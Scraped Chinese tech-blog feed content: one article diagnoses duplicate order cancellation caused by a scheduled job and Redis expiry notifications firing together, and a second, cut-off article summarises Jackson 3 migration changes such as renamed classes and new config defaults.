ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Bug 场景</h2>
<p>在一个电商系统中，订单创建后若 30 分钟未支付则自动取消。系统采用两种方式处理超时订单：① 定时任务（每 5 分钟扫描一次未支付订单，执行取消逻辑）；② 基于 Redis 过期键通知（订单创建时在 Redis 中设置 30 分钟过期键，过期时触发取消回调）。但实际运行中发现，部分订单被重复取消，导致库存回滚多次，出现库存异常。</p>
<h2 data-id="heading-1">二、代码示例</h2>
<h3 data-id="heading-2">定时任务取消订单</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@EnableScheduling</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderTimeoutSchedule</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-comment">// 每5分钟执行一次</span>
    <span class="hljs-meta">@Scheduled(cron = "0 0/5 * * * ?")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelTimeoutOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 查询30分钟前未支付的订单</span>
        List&lt;Order&gt; timeoutOrders = orderService.queryUnpaidOrdersBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">30</span>));
        <span class="hljs-keyword">for</span> (Order order : timeoutOrders) {
            <span class="hljs-comment">// 执行取消订单逻辑（扣减的库存回滚）</span>
            orderService.cancelOrder(order.getId());
        }
    }
}
</code></pre>
<h3 data-id="heading-3">Redis 过期通知取消订单</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisKeyExpireListener</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 订阅Redis过期键通知</span>
        redisTemplate.getConnectionFactory().getConnection().subscribe(
            message -&gt; {
                <span class="hljs-comment">// 消息内容为过期的键名，格式：order:timeout:{orderId}</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">expiredKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());
                <span class="hljs-keyword">if</span> (expiredKey.startsWith(<span class="hljs-string">"order:timeout:"</span>)) {
                    <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> expiredKey.split(<span class="hljs-string">":"</span>)[<span class="hljs-number">2</span>];
                    <span class="hljs-comment">// 执行取消订单逻辑</span>
                    orderService.cancelOrder(Long.parseLong(orderId));
                }
            },
            <span class="hljs-string">"__keyevent@0__:expired"</span>.getBytes()
        );
    }
}
</code></pre>
<h3 data-id="heading-4">订单服务（取消订单逻辑）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductMapper productMapper;

    <span class="hljs-comment">/**
     * 取消订单（回滚库存）
     */</span>
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrder</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span> || order.getStatus() != <span class="hljs-number">0</span>) { <span class="hljs-comment">// 0-未支付</span>
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 1. 更新订单状态为取消</span>
        order.setStatus(<span class="hljs-number">2</span>); <span class="hljs-comment">// 2-已取消</span>
        orderMapper.updateById(order);
        <span class="hljs-comment">// 2. 回滚商品库存</span>
        productMapper.increaseStock(order.getProductId(), order.getQuantity());
    }

    <span class="hljs-comment">// 其他方法：queryUnpaidOrdersBefore等</span>
}
</code></pre>
<h2 data-id="heading-5">三、问题描述</h2>
<ol>
<li>
<p><strong>预期行为</strong>：每个超时未支付的订单仅被取消一次，库存正确回滚一次。</p>
</li>
<li>
<p><strong>实际行为</strong>：部分订单被重复取消，导致库存多次回滚（例如，实际库存 10 件，订单购买 2 件，重复取消 3 次后库存变为 16 件）。原因如下：</p>
<ul>
<li><strong>定时任务与 Redis 通知冲突</strong>：同一订单既被定时任务扫描到，又触发了 Redis 过期通知，两种机制同时执行取消逻辑。</li>
<li><strong>定时任务内部并发</strong>：定时任务执行时，若处理时间过长，下一次任务提前启动（如前一次未执行完，新任务开始），导致同一批订单被重复处理。</li>
<li><strong>订单状态判断非原子</strong>：<code>cancelOrder</code> 方法中，“查询订单状态” 与 “更新状态” 非原子操作，高并发下可能多个线程同时通过状态检查，执行后续逻辑。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-6">四、解决方案</h2>
<ol>
<li>
<p><strong>统一超时取消入口</strong>：保留一种主要机制（如 Redis 过期通知），定时任务作为兜底，且兜底任务增加幂等性校验。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 定时任务优化：仅处理未被Redis通知处理的订单</span>
<span class="hljs-meta">@Scheduled(cron = "0 0/5 * * * ?")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelTimeoutOrders</span><span class="hljs-params">()</span> {
    List&lt;Order&gt; timeoutOrders = orderService.queryUnpaidOrdersBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">35</span>)); <span class="hljs-comment">// 比Redis过期时间晚5分钟，确保Redis已处理</span>
    <span class="hljs-keyword">for</span> (Order order : timeoutOrders) {
        orderService.cancelOrder(order.getId());
    }
}
</code></pre>
</li>
<li>
<p><strong>定时任务加分布式锁</strong>：防止任务并发执行，确保同一时间只有一个实例的定时任务在运行。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Scheduled(cron = "0 0/5 * * * ?")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelTimeoutOrders</span><span class="hljs-params">()</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"lock:order:cancel:schedule"</span>;
    <span class="hljs-type">Boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().setIfAbsent(lockKey, <span class="hljs-string">"1"</span>, <span class="hljs-number">1</span>, TimeUnit.MINUTES);
    <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(locked)) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 执行取消逻辑</span>
            List&lt;Order&gt; timeoutOrders = orderService.queryUnpaidOrdersBefore(LocalDateTime.now().minusMinutes(<span class="hljs-number">35</span>));
            <span class="hljs-keyword">for</span> (Order order : timeoutOrders) {
                orderService.cancelOrder(order.getId());
            }
        } <span class="hljs-keyword">finally</span> {
            redisTemplate.delete(lockKey);
        }
    }
}
</code></pre>
</li>
<li>
<p><strong>订单状态更新原子化</strong>：通过 SQL 条件更新确保状态判断与更新的原子性，替代先查后更。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrder</span><span class="hljs-params">(Long orderId)</span> {
    <span class="hljs-comment">// 1. 原子更新订单状态（仅当状态为0时更新为2）</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">updateRows</span> <span class="hljs-operator">=</span> orderMapper.updateStatusToCanceled(orderId);
    <span class="hljs-keyword">if</span> (updateRows == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 状态已变更，无需处理</span>
    }
    <span class="hljs-comment">// 2. 回滚库存（仅当状态更新成功时执行）</span>
    <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectById(orderId);
    productMapper.increaseStock(order.getProductId(), order.getQuantity());
}
</code></pre>
<p>对应的 SQL（OrderMapper.xml）：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateStatusToCanceled"</span>&gt;</span>
    UPDATE `order` 
    SET status = 2, cancel_time = NOW() 
    WHERE id = #{orderId} AND status = 0
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
</code></pre>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jackson 3 迁移核心注意点总结]]></title>    <link>https://juejin.cn/post/7581727073580941363</link>    <guid>https://juejin.cn/post/7581727073580941363</guid>    <pubDate>2025-12-10T00:44:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073580941363" data-draft-id="7581666815002509363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jackson 3  迁移核心注意点总结"/> <meta itemprop="keywords" content="JSON,Java"/> <meta itemprop="datePublished" content="2025-12-10T00:44:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="闲煮光阴"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jackson 3  迁移核心注意点总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    闲煮光阴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:44:30.000Z" title="Wed Dec 10 2025 00:44:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、核心要点（必掌握，迁移基础）</h2>
<p><strong>1. 环境基线升级：</strong> 最低支持 JDK 17（2.x 为 JDK 8），项目需先完成 JDK 升级适配。</p>
<p><strong>2. 包名与依赖变更：</strong></p>
<ul>
<li>Maven groupId：com.fasterxml.jackson → tools.jackson（jackson-annotations 除外，仍用 2.x 版本）Java 导入包：</li>
<li>com.fasterxml.jackson.xxx → tools.jackson.xxx（com.fasterxml.jackson.annotation 保留不变）</li>
</ul>
<p><strong>3. 核心 API 不可变性：</strong> ObjectMapper（及子类）、JsonFactory（及子类）变为完全不可变，必须通过 Builder 模式构建（不再支持直接 set 配置）。</p>
<pre><code class="hljs language-java" lang="java">JsonMapper m=JsonMapper.builder().build();
<span class="hljs-type">JsonFactory</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> JsonFactory.builder().build();
</code></pre>
<p><strong>4 .异常体系重构：</strong> 所有异常改为非检查型（继承 RuntimeException），核心异常类重命名（如 JsonProcessingException → JacksonException）。
<strong>5. 格式绑定强制化：</strong> 必须使用格式对齐的 ObjectMapper 子类（如 JsonMapper、YAMLMapper、XmlMapper），禁止 new ObjectMapper(new YAMLFactory()) 写法。
<strong>6. Java 8 模块内置：</strong> jackson-module-parameter-names、jackson-datatype-jdk8、jackson-datatype-jsr310 已整合到 jackson-databind，无需单独依赖。</p>
<h2 data-id="heading-1">二、关键变更（影响代码改造）</h2>
<p><strong>1. 内容移除</strong></p>
<ul>
<li>版本标记为 @Deprecated 的方法、字段、类全部删除（ 参考 2.20 javadoc 替换为替代方案）。</li>
<li>移除模块 jackson-module-jsonSchema 、jackson-datatype-hibernateX。</li>
<li>移除功能：格式自动检测（DataFormatDetector 等相关类）、ObjectMapper.canSerialize()/canDeserialize() 方法。</li>
<li>JsonParser <code>canWriteBinaryNatively(), canWriteFormattedNumbers() </code>分别替为 <code> StreamWriteCapability.CAN_WRITE_BINARY_NATIVELY  /  StreamWriteCapability.CAN_WRITE_FORMATTED_NUMBERS</code></li>
<li>JsonFactory  <code>getCodec() 、 setCodec()</code> 被移除</li>
<li>com.fasterxml.jackson.databind.MappingJsonFactory  被移除</li>
<li>com.fasterxml.jackson.core.ObjectCodec 被移除，替换为 2 个独立的接口：  tools.jackson.core.ObjectReadContext（实现类：DeserializationContext） ， tools.jackson.core.ObjectWriteContext（实现类：
SerializationContext ）</li>
<li>tools.jackson.databind.jsontype.impl.LaissezFaireSubTypeValidator 已不再公开。请使用  BasicPolymorphicTypeValidator.builder()</li>
<li>JsonGenerator.setPrettyPrinter() 被移除</li>
<li>request payload 能力被移除</li>
<li>BufferRecyclers.SYSTEM_PROPERTY_TRACK_REUSABLE_BUFFERS 被移除</li>
<li>TokenStreamFactory.Feature.USE_THREAD_LOCAL_FOR_BUFFER_RECYCLING 被移除</li>
<li>在 Jackson 2.x 的 JsonFactory 类中，接受 URL 参数的工厂方法将被移除</li>
</ul>
<p><strong>2. 类与方法重命名（高频变更）</strong></p>















































































































































<table><thead><tr><th>2.x 旧名称</th><th>3.x 新名称</th></tr></thead><tbody><tr><td>JsonProcessingException</td><td>JacksonException（基类）</td></tr><tr><td>JsonParseException</td><td>StreamReadException</td></tr><tr><td>JsonEOFException </td><td>UnexpectedEndOfInputException </td><td/><td>JsonGenerationException  </td><td>StreamWriteException </td></tr><tr><td>JsonGenerator.writeObject()</td><td>JsonGenerator.writePOJO()</td></tr><tr><td>JsonGenerator.getCurrentValue()</td><td>JsonGenerator.currentValue()</td><td/><td>JsonGenerator.setCurrentValue()</td><td>JsonGenerator.assignCurrentValue()</td></tr><tr><td>JsonGenerator.getCodec()</td><td>JsonGenerator.objectWriteContext()</td></tr><tr><td>JsonParser.getCurrentLocation()</td><td>JsonParser.currentLocation()</td></tr><tr><td>JsonParser.getTokenLocation()</td><td>JsonGenerator.currentTokenLocation()</td></tr><tr><td>JsonParser.getCurrentValue()</td><td>JsonParser.currentValue()</td></tr><tr><td>JsonParser.setCurrentValue()</td><td>JsonParser.assignCurrentValue()</td></tr><tr><td>JsonParser."xxxTextYyy"() 格式 如（getTextCharacters()）</td><td>JsonParser."xxxStringYyy"() 格式 如（getStringCharacters()）</td></tr><tr><td>JsonParser.getCodec()</td><td>JsonParser.objectReadContext()</td></tr><tr><td>JsonToken.FIELD_NAME</td><td>JsonToken.PROPERTY_NAME</td></tr><tr><td>JsonFactory </td><td>TokenStreamFactory </td></tr><tr><td>JsonStreamContext </td><td>TokenStreamContext </td></tr><tr><td>JsonLocation </td><td>TokenStreamLocation</td></tr><tr><td>JsonDeserializer</td><td>ValueDeserializer</td></tr><tr><td>JsonSerializer</td><td>ValueSerializer</td></tr><tr><td>JsonMappingException</td><td>DatabindException</td></tr><tr><td>Module</td><td>JacksonModule（避免与 JDK Module 冲突）</td></tr><tr><td>TextNode</td><td>StringNode</td></tr><tr><td>BeanSerializerModifier</td><td>ValueSerializerModifier</td></tr><tr><td>BeanDeserializerModifier</td><td>ValueDeserializerModifier</td></tr><tr><td>SerializerProvider </td><td>SerializationContext </td></tr><tr><td>TextNode</td><td>StringNode</td></tr><tr><td>AnnotationIntrospector.findDefaultCreator()</td><td>findPreferredCreator()</td></tr><tr><td>JsonNode.elements()</td><td>JsonNode.values()</td></tr><tr><td>ContainerSerializer</td><td>StdContainerSerializer</td></tr><tr><td>ObjectMapper.getRegisteredModuleIds()</td><td>ObjectMapper.registeredModules()</td></tr><tr><td>TreeNode.propertyNames()  的返回类型</td><td>从  Iterator  更改为  Collection</td></tr><tr><td>TreeNode.isContainerNode()</td><td>TreeNode. isContainer()</td></tr><tr><td>JsonGenerator.Feature.AUTO_CLOSE_JSON_CONTENT</td><td>JsonGenerator.Feature.AUTO_CLOSE_CONTENT</td></tr></tbody></table>
<p><strong>3. 配置默认值变更（易引发行为差异）</strong></p>




















































































































































































<table><thead><tr><th>枚举</th><th>配置项</th><th>2.x 默认值</th><th>3.x 默认值</th><th>影响说明</th></tr></thead><tbody><tr><td>DeserializationFeature</td><td>FAIL_ON_TRAILING_TOKENS</td><td>关闭</td><td>开启</td><td>校验 JSON 末尾是否存在多余字符（如解析对象后还有额外的逗号 / 字符），提升数据合法性校验，但会增加少量解析开销；若输入数据可信（如内部系统交互），可关闭以恢复 2.x 性能。</td></tr><tr><td/><td>FAIL_ON_UNKNOWN_PROPERTIES</td><td>开启</td><td>关闭</td><td>反序列化时遇到目标类不存在的字段，不再抛出 UnrecognizedPropertyException，而是直接忽略；可能掩盖字段名拼写错误、接口字段变更等问题，建议在测试环境开启该配置，生产环境按需关闭。</td></tr><tr><td/><td>READ_ENUMS_USING_TO_STRING</td><td>关闭</td><td>开启（迁移至 EnumFeature）</td><td>反序列化枚举时，默认按 Enum.toString() 结果匹配（2.x 默认按枚举名称 / 索引）；若枚举重写了 toString()，会改变反序列化逻辑，需确认枚举值映射规则，或显式配置 EnumFeature.READ_ENUMS_USING_TO_STRING=false 回退。</td></tr><tr><td/><td>FAIL_ON_NULL_FOR_PRIMITIVES</td><td>关闭</td><td>开启</td><td>反序列化时，若基本类型（int/long/boolean 等）字段接收到 null 值，会抛出 DatabindException；2.x 会默认赋值基本类型默认值（如 int=0），可能暴露空值处理漏洞，但也会导致原有依赖 “空值转默认值” 的代码报错。</td></tr><tr><td>SerializationFeature</td><td>WRITE_ENUMS_USING_TO_STRING</td><td>关闭</td><td>开启（迁移至 EnumFeature）</td><td>序列化枚举时，默认输出 Enum.toString() 结果（2.x 默认输出枚举名称）；若枚举重写了 toString()，序列化结果会变化，需统一枚举序列化规则，或配置 EnumFeature.WRITE_ENUMS_USING_TO_STRING=false。</td></tr><tr><td/><td>FAIL_ON_EMPTY_BEANS</td><td>开启</td><td>关闭</td><td>序列化无属性 / 无 getter 的空 Bean 时，不再抛出 JsonMappingException，而是输出空对象 {}；避免因 Bean 结构临时调整导致序列化失败，但需注意空对象可能不符合下游系统的解析预期。</td></tr><tr><td/><td>FAIL_ON_ORDER_MAP_BY_INCOMPARABLE_KEY</td><td>开启</td><td>关闭</td><td>序列化 SortedMap 时，若 Key 不实现 Comparable 接口，不再抛出异常；2.x 会强制校验 Key 的可比较性，3.x 放宽限制，但可能导致 Map 排序混乱，需确保 SortedMap 的 Key 符合 Comparable 规范。</td></tr><tr><td/><td>WRITE_DURATIONS_AS_TIMESTAMPS</td><td>开启</td><td>关闭（迁移至 DateTimeFeature）</td><td>序列化 java.time.Duration 时，默认输出 ISO-8601 字符串（如 PT1H30M），而非 2.x 的毫秒数时间戳；需确认下游系统是否兼容 Duration 的字符串格式，或配置 DateTimeFeature.WRITE_DURATIONS_AS_TIMESTAMPS=true 回退。</td></tr><tr><td/><td>WRITE_DATES_AS_TIMESTAMPS</td><td>开启</td><td>关闭（迁移至 DateTimeFeature）</td><td>序列化日期时间类型（如 LocalDateTime/Date）时，默认输出 ISO-8601 字符串（如 2025-12-09T10:00:00），而非 2.x 的毫秒时间戳；会改变接口返回的日期格式，需同步更新前端 / 下游系统的解析逻辑。</td></tr><tr><td/><td>WRITE_DATE_KEYS_AS_TIMESTAMPS</td><td>关闭</td><td>关闭（迁移至 DateTimeFeature）</td><td>无默认值变化，但配置项归属从 SerializationFeature 迁移至 DateTimeFeature；代码中需替换配置引用路径，否则会报 “配置项不存在” 错误。</td></tr><tr><td>StreamReadFeature</td><td>USE_FAST_DOUBLE_PARSER</td><td>关闭</td><td>开启</td><td>解析浮点数字段时使用更快的双精度解析器（基于 jdk.incubator.vector 或优化算法）；提升浮点数解析性能，但极端场景下可能存在精度差异（概率极低），需校验高精度浮点数据的解析结果。</td></tr><tr><td/><td>USE_FAST_BIG_NUMBER_PARSER</td><td>关闭</td><td>开启</td><td>解析大数字（如 BigDecimal/BigInteger）时使用优化解析器；提升大数字解析效率，无兼容性风险，但需确保解析后的大数精度符合业务要求。</td></tr><tr><td>StreamWriteFeature</td><td>USE_FAST_DOUBLE_WRITER</td><td>关闭</td><td>开启</td><td>序列化浮点数时使用更快的双精度写入器；提升浮点数字段序列化性能，极端场景可能存在小数位输出格式差异（如 0.1 变为 0.100000001），需校验金融 / 高精度场景的浮点输出。</td></tr><tr><td>TokenStreamFactory.Feature</td><td>INTERN_PROPERTY_NAMES</td><td>启用</td><td>关闭</td><td>不再对 JSON 属性名进行字符串驻留（String Intern）；减少内存占用（避免常量池膨胀），但频繁解析相同属性名的 JSON 时，会增加字符串创建开销，高并发场景可按需重新开启。</td></tr><tr><td>MapperFeature</td><td>USE_STD_BEAN_NAMING</td><td>关闭</td><td>移除（始终启用）</td><td>强制使用标准 JavaBean 命名规范（如 getXxx() 对应字段 xxx）；2.x 需手动开启，3.x 内置生效，若代码依赖非标准命名（如 getXXX() 对应 XXX），会导致字段序列化 / 反序列化失败。</td></tr><tr><td/><td>AUTO_DETECT_xxx（CREATORS/FIELDS/GETTERS/IS_GETTERS/SETTERS）</td><td>开启</td><td>移除</td><td>不再自动检测 Bean 的创建器 / 字段 / 访问器，需显式配置可见性规则；2.x 依赖自动检测的场景（如无注解的私有字段序列化）会失效，需通过 changeDefaultVisibility 配置字段 / 方法的可见性。</td></tr><tr><td/><td>ALLOW_FINAL_FIELDS_AS_MUTATORS</td><td>启用</td><td>关闭</td><td>禁止通过反射修改 final 字段的值；2.x 允许强制修改 final 字段（非规范行为），3.x 禁用后，依赖 “final 字段反序列化赋值” 的代码会报错，需改为通过构造器 / 工厂方法初始化 final 字段。</td></tr><tr><td/><td>DEFAULT_VIEW_INCLUSION</td><td>启用</td><td>关闭</td><td>未指定 @JsonView 时，不再默认序列化所有字段，仅序列化无 View 注解的字段；若代码依赖 “默认包含所有字段” 的逻辑，需显式配置 MapperFeature.DEFAULT_VIEW_INCLUSION=true，或补全 @JsonView 注解。</td></tr><tr><td/><td>USE_GETTERS_AS_SETTERS</td><td>启用</td><td>关闭</td><td>不再将 getXxx() 方法当作 setXxx() 使用（如反序列化集合字段时调用 getter 获取集合后添加元素）；2.x 为兼容 JAXB 的非规范行为，3.x 禁用后，需为集合 / 